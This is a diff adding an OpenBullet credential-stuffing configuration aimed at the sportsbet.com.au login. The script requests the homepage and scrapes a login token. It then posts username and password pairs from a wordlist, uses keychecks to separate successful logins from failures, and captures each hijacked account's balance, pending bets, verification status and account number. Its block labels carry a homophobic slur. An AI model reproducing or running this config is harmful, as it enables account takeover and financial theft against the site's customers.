@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Sports Bet",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-03T09:42:15.593964+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#HomoSexualPantherGET REQUEST GET "https://www.sportsbet.com.au/?_ga=2.243600773.188088120.1530609612-1903884522.1530609612&_gac=1.113064310.1530609612.Cj0KCQjwvezZBRDkARIsADKQyPn2nKH1IqiuUPEFYYc2C913KJSMhL4bPn4MQCHqhF6iZPAsQ0s8LIYaAjJ5EALw_wcB" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPantherUID PARSE "<SOURCE>" CSS "[name=login_uid]" "value" 0 -> VAR "UID" "" "" 
+#HomoSexualPantherPOST REQUEST POST "https://www.sportsbet.com.au/account" AutoRedirect=TRUE 
+  CONTENT "appears_as_logged_out=1&action=DoLogin&form_name=header&login_uid=<UID>&fakeusername=Enter+Username&username=<USER>&password=<PASS>&multi_variant_cookie_content=Header_Trial_R19%3D11" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPantherMINESWEEPER KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry! Your Login has failed" 
+    KEY "Please re-enter your login details" 
+    KEY "Please re-enter your login details" 
+  KEYCHAIN Success OR 
+    KEY "Logout\">Log out</a>" 
+#HomoSexualPantherVERIFCATION PARSE "<SOURCE>" LR "<div class=\"verify-reminder cfix\">" ".</p>" Recursive=FALSE -> CAP "Status" "" "" 
+#HomoSexualPantherPENDING PARSE "<SOURCE>" LR "			<span id=\"pending-bets\" class=\"value\">" "</span>" Recursive=FALSE -> CAP "Pending Bets" "" "" 
+#HomoSexualPantherBALANCE PARSE "<SOURCE>" LR "<span id=\"balance-value\" class=\"ib balance-value-span\" style=\"display: block;\" onmouseover=\"custinfo.build_bubble(this.id,'nr');\" onmouseout=\"custinfo.remove_bubble(this.id);\">" "</span>" Recursive=FALSE -> CAP "Balance" "" "" 
+#HomoSexualPanther# PARSE "<SOURCE>" LR "<span class=\"value\" id=\"acct-no\">" "</span>" Recursive=FALSE -> CAP "account #" "" "" 
